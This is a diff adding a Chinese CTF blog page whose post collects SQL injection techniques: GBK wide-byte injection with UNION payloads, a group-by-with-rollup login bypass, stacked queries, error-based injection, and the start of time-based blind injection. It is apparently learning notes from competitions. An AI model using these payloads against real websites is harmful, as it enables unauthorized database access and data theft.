@@ -1,0 +1,1351 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>SQL | Hexo</title>
+  <meta name="keywords" content=" SQL ">
+  <meta name="description" content="SQL | Hexo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="session的反序列化利用">
+<meta name="keywords" content="serialize,php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Session_unserlize">
+<meta property="og:url" content="https://github.com/BrainLyh/2019/08/01/session_unserialize/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="session的反序列化利用">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg">
+<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png">
+<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg">
+<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg">
+<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg">
+<meta property="og:updated_time" content="2019-08-01T11:53:15.102Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Session_unserlize">
+<meta name="twitter:description" content="session的反序列化利用">
+<meta name="twitter:image" content="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/gruvbox-dark.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Luc1fer</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/BrainLyh" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:brainsemail@163.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=12128&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="neteasemusic" href="https://music.163.com/#/user/home?id=125977062" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-neteasemusic"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(13)</small></div></li>
+    
+        
+            
+            <li><div data-rel="WP">WP<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="比赛回顾">比赛回顾<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="渗透测试">渗透测试<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="LSB">LSB<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="serialize">serialize<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="RSA">RSA<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="SQL">SQL<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="13">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://www.gtfly.top/">gtfly</a></li>
+            
+            <li><a target="_blank" href="https://www.leavesongs.com/">P神</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">WP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">比赛回顾</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">工具</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">渗透测试</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">LSB</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">MISC</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">隐写</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">RSA</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">serialize</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">SQL</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">哈希长度扩展攻击</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="WP "
+           href="/2018/03/23/CSAW CTF 2016 mfw Writeup/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="CSAW CTF 2016 mfw Writeup">CSAW CTF 2016 mfw Writeup</span>
+            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2017/03/23/HackLu Flatscience WP/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="HackLu FlatScience WP">HackLu FlatScience WP</span>
+            <span class="post-date" title="2017-03-23 15:13:47">2017/03/23</span>
+        </a>
+        
+        <a  class="比赛回顾 "
+           href="/2018/07/22/ISCC线下赛回顾/"
+           data-tag="比赛回顾"
+           data-author="" >
+            <span class="post-title" title="2019 ISCC线下赛回顾">2019 ISCC线下赛回顾</span>
+            <span class="post-date" title="2018-07-22 15:00:00">2018/07/22</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/2018/02/23/Nessus使用指南/"
+           data-tag="工具,渗透测试"
+           data-author="" >
+            <span class="post-title" title="Nessus 使用指南">Nessus 使用指南</span>
+            <span class="post-date" title="2018-02-23 15:13:47">2018/02/23</span>
+        </a>
+        
+        <a  class="LSB "
+           href="/2018/03/23/LSB隐写/"
+           data-tag="LSB,MISC,隐写"
+           data-author="" >
+            <span class="post-title" title="LSB图片隐写">LSB图片隐写</span>
+            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2019/07/26/peaCTF-WP/"
+           data-tag="WP,RSA"
+           data-author="" >
+            <span class="post-title" title="peaCTF WP">peaCTF WP</span>
+            <span class="post-date" title="2019-07-26 15:13:47">2019/07/26</span>
+        </a>
+        
+        <a  class="serialize "
+           href="/2019/03/23/序列化与反序列化/"
+           data-tag="serialize,php"
+           data-author="" >
+            <span class="post-title" title="序列化与反序列化">序列化与反序列化</span>
+            <span class="post-date" title="2019-03-23 15:13:47">2019/03/23</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/2018/03/23/渗透测试-信息收集/"
+           data-tag="渗透测试"
+           data-author="" >
+            <span class="post-title" title="渗透测试-信息收集">渗透测试-信息收集</span>
+            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2018/03/23/HITCON-Babytrick/"
+           data-tag="WP,serialize,SQL"
+           data-author="" >
+            <span class="post-title" title="HITCON-babytrick">HITCON-babytrick</span>
+            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="WP "
+           href="/2019/08/01/JarvisOJ/"
+           data-tag="WP,serialize,SQL,哈希长度扩展攻击"
+           data-author="" >
+            <span class="post-title" title="JarvisOJ WP">JarvisOJ WP</span>
+            <span class="post-date" title="2019-08-01 19:37:28">2019/08/01</span>
+        </a>
+        
+        <a  class="RSA "
+           href="/2018/05/23/RSA/"
+           data-tag="RSA"
+           data-author="" >
+            <span class="post-title" title="RSA">RSA</span>
+            <span class="post-date" title="2018-05-23 15:13:47">2018/05/23</span>
+        </a>
+        
+        <a  class="serialize "
+           href="/2019/08/01/session_unserialize/"
+           data-tag="serialize,php"
+           data-author="" >
+            <span class="post-title" title="Session_unserlize">Session_unserlize</span>
+            <span class="post-date" title="2019-08-01 19:33:07">2019/08/01</span>
+        </a>
+        
+        <a  class="SQL "
+           href="/2019/07/28/SQL/"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="SQL">SQL</span>
+            <span class="post-date" title="2019-07-28 15:13:47">2019/07/28</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-SQL" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">SQL</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" data-rel="SQL">SQL</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color4">SQL</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-08-01 19:53:27'>2019-07-28 15:13</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ISCC中碰到的group-by…with-rollup"><span class="toc-text">ISCC中碰到的group by…with rollup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆叠注入"><span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#函数"><span class="toc-text">函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配合if条件触发"><span class="toc-text">配合if条件触发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#字符串截取函数"><span class="toc-text">字符串截取函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配合-case-when…then…else…end-触发"><span class="toc-text">配合 case when…then…else…end 触发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#除了sleep之外的函数"><span class="toc-text">除了sleep之外的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BENCHMARK-count-expr"><span class="toc-text">BENCHMARK(count,expr)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#笛卡尔积"><span class="toc-text">笛卡尔积</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GET-LOCK"><span class="toc-text">GET_LOCK</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RLIKE"><span class="toc-text">RLIKE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数-1"><span class="toc-text">函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UNION-联合查询注入"><span class="toc-text">UNION 联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#关键词过滤"><span class="toc-text">关键词过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关键函数过滤"><span class="toc-text">关键函数过滤</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧</p>
+<a id="more"></a>
+<hr>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>GBK是一种多字符的编码，通常来说，一个GBK编码的字符占用两个字节，一个UTF-8的字符占用三个字节。</p>
+<p><strong>转义字符</strong>：为了过滤用户输入数据，对一些特殊字符加上反斜杠”<br>“进行转义，mysql中转义函数有</p>
+<pre><code>addslashes,mysql_real_escape_string,mysql_escape_string等，还有一种是配置magic_quote_gpc,不过高版本已经移除该功能</code></pre><p><strong>宽字节注入</strong>是指mysql数据库在使用GBK编码时会认为两个字符是一个汉子(前一个字符的ascii码要大于128才到汉字范围)，而且当我们引入单引号时，mysql会调用转义函数，将单引号变为&#39;,其中的 \ 十六进制为%5C,mysql的GBK编码会认为 %df%5C 是一个宽字节，从而使单引号闭合(逃逸)，从而注入攻击。</p>
+<p><strong>sql数据的变化过程</strong></p>
+<pre><code>%df%27--&gt;addslashes()--&gt;%df%5C%27--&gt;GBK--&gt;運&#39;
+
+用户输入--&gt;过滤函数--&gt;代码层$sql--&gt;mysql处理请求--&gt;mysql中的sql</code></pre><p>测试题目是南邮的GBK injection</p>
+<p>测试发现加上单引号没有报错但是有转义操作，在单引号前面插入了反斜杠</p>
+<pre><code>?id=1&#39;        
+your sql:select id,title from news where id = &#39;1\&#39;&#39;</code></pre><p>进行宽字节注入</p>
+<pre><code>?id=1%df%27
+your sql:select id,title from news where id = &#39;1運&#39;&#39;</code></pre><p>如上所述，加入%df之后mysql认为%df%5C是一个汉字，这样单引号就逃逸出来，但是这里还会报错，因为我们人为的闭合了一个单引号之后查询语句长这样</p>
+<pre><code>id=&#39;運&#39;&#39;</code></pre><p>我们还要把最后一个单引号注释掉才行</p>
+<pre><code>?id=1%df%27%23</code></pre><p>注入成功，该查询字段数，查询字段数要用union探测内容，而union得规则是必须列数相同才能正常展示，所以要探测列数，保证构造的查询结果与元数据查询结果的数据结构相同；’order by 1’代表按第一列升序排列，数字代表的列不存在就会报错</p>
+<pre><code>?id=1%df%27 order by 2 %23
+your sql:select id,title from news where id = &#39;1運&#39; order by 2 #&#39;
+here is the information</code></pre><p>再探测字段的显示位，即表中数据第几位的字段可以显示。id的值要用-1或者表中没有用过的id值，否则测试值会被覆盖。</p>
+<p>接下来就是常规的注入</p>
+<pre><code>数据库
+?id=-1%df%27 union select 1,group_concat(database()) %23
+表
+?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23
+字段
+?id=-1%df%27% union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23
+因为这对单引号的转义，我们使用十六进制来读取
+信息
+?id=-1%df%27 union select 1,group_concat(flag) from ctf4 %23</code></pre><h2 id="ISCC中碰到的group-by…with-rollup"><a href="#ISCC中碰到的group-by…with-rollup" class="headerlink" title="ISCC中碰到的group by…with rollup"></a>ISCC中碰到的group by…with rollup</h2><p>题目来自ISCC线下赛hint.txt</p>
+<pre><code>$sql=&quot;SELECT pwd FROM user WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;
+$query = mysqli_query($con,$sql); 
+if (mysqli_num_rows($query) == 1) { 
+    $key = mysqli_fetch_array($query);
+    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {
+        echo &quot;xxxxxxxxx&quot;;
+    }else{
+        echo &quot;你这密码不太对啊&quot;;
+    }
+}else if(mysqli_num_rows($query) == 0){
+    echo &quot;你这密码不太对啊&quot;;
+}
+else{
+    echo &quot;数据太多了&quot;;
+}</code></pre><p>分析题目可知我们需要post一个uname，进行弱比较相等，使得查询结果为空，然后我们也post一个空值就行了。</p>
+<p>group by 分析</p>
+<pre><code>mysql&gt; select * from member;
++----+----------+--------------------------------------+-------------------+
+| id | username | pws                                  | email             |
++----+----------+--------------------------------------+-------------------+
+|  1 | vince    | e10adc3949ba59abbe56e                   | vince@pikachu.com |
+|  2 | allen    | e10adc3949ba59abbe56e                   | allen@pikachu.com |
+|  3 | kobe     | e10adc3949ba59abbe56ekes                | kobe@pikachu.com  |
+|  4 | grady    | e10adc3949ba59abbe56e                 | grady@pikachu.com |
+|  5 | kevin    | e10adc3949ba59abbe56ema City Thunder | kevin@pikachu.com |
+|  6 | lucy     | e10adc3949ba59abbe56e                   | lucy@pikachu.com  |
+|  7 | lili     | e10adc3949ba59abbe56e                   | lili@pikachu.com  |
++----+----------+--------------------------------------+-------------------+
+
+mysql&gt; select username from member where sex=&#39;boy&#39; group by username;
++----------+
+| username |
++----------+
+| allen|
+| grady|
+| kevin|
+| kobe |
+| vince|
++----------+
+5 rows in set (0.00 sec)</code></pre><p>group by 对结果进行分类，而with rollup字句将在查询的结果最后一行添上一行数据，来显示分组统计的基础上再进行数据的汇总，但是这里的汇总不是简单的求和，而是要根据对数据处理采用的函数决定的</p>
+<pre><code>mysql&gt; select username from member where sex=&#39;boy&#39; group by username with rollup;
++----------+
+| username |
++----------+
+| allen|
+| grady|
+| kevin|
+| kobe |
+| vince|
+| NULL |
++----------+
+6 rows in set (0.00 sec)</code></pre><p>对于这个题目，我们需要使得查询的结果不为空。可以使用异或来绕过判断。</p>
+<pre><code> mysql&gt; select 1^1;
++-----+
+| 1^1 |
++-----+
+|   0 |
++-----+
+1 row in set (0.00 sec)
+
+mysql&gt; select &#39;aaa&#39;=1;
++---------+
+| &#39;aaa&#39;=1 |
++---------+
+|   0 |
++---------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; select &#39;id&#39;=0;
++--------+
+| &#39;id&#39;=0 |
++--------+
+|  1 |
++--------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; select &#39;id111&#39;=0;
++-----------+
+| &#39;id111&#39;=0 |
++-----------+
+| 1 |
++-----------+
+1 row in set, 1 warning (0.00 sec)
+
+
+uname=&#39;1&#39;^1--&gt;uname=0--&gt;相等
+#异或操作对任一操作数为NULL则返回NULL，对于非NULL得操作数，如果奇数个操作数非零，则值为1，否则为零。</code></pre><p>最后payload为：</p>
+<pre><code>uname=&#39;1&#39;^1 group by pwd with rollup limit 1 offset 1%23&#39;</code></pre><p>稍微解释一下limit offset</p>
+<pre><code>mysql&gt; select * from member limit 3 offset 1;
++----+----------+----------------------------------+-----+-------------+--------
+---+-------------------+
+| id | username | pw   | sex | phonenum| address
+   | email |
++----+----------+----------------------------------+-----+-------------+--------
+---+-------------------+
+|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76
+   | allen@pikachu.com |
+|  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lak
+es | kobe@pikachu.com  |
+|  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs
+   | grady@pikachu.com |
++----+----------+----------------------------------+-----+-------------+--------
+---+-------------------+
+3 rows in set (0.00 sec)
+
+从第一行开始打印3行数据
+
+mysql&gt; select * from member limit 1,3;
++----+----------+----------------------------------+-----+-------------+--------
+---+-------------------+
+| id | username | pw   | sex | phonenum| address
+   | email |
++----+----------+----------------------------------+-----+-------------+--------
+---+-------------------+
+|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76
+   | allen@pikachu.com |
+|  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lak
+es | kobe@pikachu.com  |
+|  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs
+   | grady@pikachu.com |
++----+----------+----------------------------------+-----+-------------+--------
+---+-------------------+
+3 rows in set (0.00 sec)
+
+从第一行开始打印三行</code></pre><p>为什么不直接用limit 1，1 呢？</p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠查询可以执行多条SQL语句，之间用分号’;’隔开.与union select 联合查询不同，堆叠查询可以执行任何语句，而后者只能执行有限的(列数相同)。</p>
+<pre><code>mysql&gt; show tables;
++----------------+
+| Tables_in_ctf4 |
++----------------+
+| admin           |
+| news           |
++----------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from admin;select * from news;
++-----+-------+----------------------------------+
+| uid | name  | pass                              |
++-----+-------+----------------------------------+
+|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |
++-----+-------+----------------------------------+
+1 row in set (0.04 sec)
+
++-----+--------+--------------------------+
+| tid | title  | content                    |
++-----+--------+--------------------------+
+|   1 | heihei | 绂绘垚鍔熷張杩戜簡涓€姝?    |
+|   2 | haha   | 椹笂灏辨垚鍔熶簡          |
++-----+--------+--------------------------+
+2 rows in set (0.03 sec)</code></pre><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。做过的几道题都是用的MariaDB</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul>
+<li>关键函数</li>
+</ul>
+<p>rand() 用于产生一个0~1的随机数</p>
+<p>floor() 向下取整</p>
+<p>rand()函数生成0~1的函数，使用floor()函数向下取整，值是固定的’0’，我们将rand*2，得到的值就是不固定的0或者1。</p>
+<p>这里为什么不能直接用一个固定的常量比如1,0？而必须使用随机函数？因为我们需要使用函数在调用时会被执行的特点。</p>
+<p>这是一句简单的查询语句</p>
+<pre><code>select floor(rand(0)*2) from information_schema.tables;</code></pre><p>加上随机种子后是一个伪随机序列。同时这个报错也与数据量有关，这个我们下文会分析</p>
+<p>伪随机的序列前几位是</p>
+<pre><code>+------------------+
+| floor(rand(0)*2) |
++------------------+
+|                0 |
+|                1 |
+|                1 |
+|                0 |
+|                1 |
+|                1 |
+|                0 |
+|                0 |
+|                1 |
+|                1 |
+|                1 |
+|                0 |
+|                1 |
+|                1 |</code></pre><p>我们使用count()和group by 来对结果进行统计，这里不加种子。</p>
+<pre><code>select count(*) from information_schema.tables group by floor(rand()*2);
+
++----------+
+| count(*) |
++----------+
+|       47 |
+|       50 |
++----------+</code></pre><p>经过测试发现不加种子也有出现报错的几率，但是我们加上种子之后必然会报错。在了解原因之前我们还要再了解一下count()函数</p>
+<ul>
+<li>count()</li>
+</ul>
+<p>在进行count时对查到的数据会创建一个虚拟表用来保存结果。如果key的结果在虚拟表中已经存在则count的结果加一，否则就插入新纪录。</p>
+<p>由上文可知，floor(rand(0)*2)的结果是固定的’011011’，所以报错的原因应该是floor(rand(0)*2)的多次计算导致的。</p>
+<pre><code>floor(rand(0*2)        011011
+0            查到0，虚拟表中不存在，执行插入
+1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是1
+1            表中存在,count+1
+0            查到0，不存在，进行插入
+1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是1
+1            报错
+
+key            count
+1            1+1
+1            报错</code></pre><p>从这里我们可以看到存在两个相同的key，主键唯一的，所以报错。表里有大于等于三条数据时就会报错。</p>
+<p>那前面说的不加种子也有几率报错是为什么？</p>
+<p>其实只要满足下面的条件就可以报错</p>
+<pre><code>查询              虚拟表插入
+第一次计算         第二次计算
+第三次计算         第四次计算</code></pre><p>只要第三次结果与第二第四都不同，同时第二第四计算相同即可</p>
+<p>我们构造下面的语句</p>
+<pre><code>select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x;
+
+ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</code></pre><p>成功返回信息</p>
+<p>如果不携带uesr()，报的是11，也就是说是concat()函数部分执行了语句</p>
+<pre><code>select count(*) from information_schema.tables group by concat(1,floor(rand(0)*2));
+
+ERROR 1062 (23000): Duplicate entry &#39;11&#39; for key &#39;group_key&#39;</code></pre><ul>
+<li>其他函数</li>
+</ul>
+<p>updataxml()</p>
+<pre><code>select * from user where username = &#39;admin&#39; or updatexml(1,concat(0x7e,(database())),0);
+
+ERROR 1105 (HY000): XPATH syntax error: &#39;~test1&#39;</code></pre><p>因为第二个参数需要Xpath格式，输入不符合就报错，最大长度为32位,extractvalue()也是如此</p>
+<p>extractvalue()</p>
+<pre><code>select * from user where username = &#39;admin&#39; and extractvalue(1,concat(0x7e,(select database())))
+
+ERROR 1105 (HY000): XPATH syntax error: &#39;~test1&#39;</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>主要两种，即 <strong>时间盲注</strong> ， <strong>布尔盲注</strong></p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>sleep() 睡眠时间为参数设定的秒数，然后返回0。若sleep()被中断，返回1。<br>假如这里我们有一张表</p>
+<pre><code>mysql&gt; select * from user;
++----+--------------------------------+----------+
+| id | username                       | password |
++----+--------------------------------+----------+
+|  1 | admin                          | 1234567  |
+|  2 | 012345678901234567890123456789 | 1234567  |
+|  3 | 012345678901234567890123456789 | 1234567  |
+|  4 | admin                          | 11111    |
+|  5 | admin                          | 222222   |
+|  6 | admin                          | 33333    |
++----+--------------------------------+----------+
+6 rows in set (0.00 sec)</code></pre><p>我们尝试查询一条数据并设置时间为3s</p>
+<pre><code>select * from user where id = 1 and sleep(3);
+Empty set (3.00 sec)</code></pre><p>可以看到成功延时了3s.如果我们查一条表里不存在的数据，则会直接返回，不执行sleep()。</p>
+<pre><code>select * from user where id = 9999 and sleep(3);
+Empty set (0.00 sec)</code></pre><p>and前面的条件为假，后面的就不再看了。同样的我们测试or</p>
+<pre><code>select * from user where id = 1 or sleep(3);
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | admin    | 1234567  |
++----+----------+----------+
+1 row in set (15.01 sec)</code></pre><p>发现时间为15s,我们可以想想表里一共有6条数据，查到第一条数据时id=1为真，此时or后面的表达式不再起作用，剩下的五条数据都为假，执行5次sleep(3),因此时间为15s。</p>
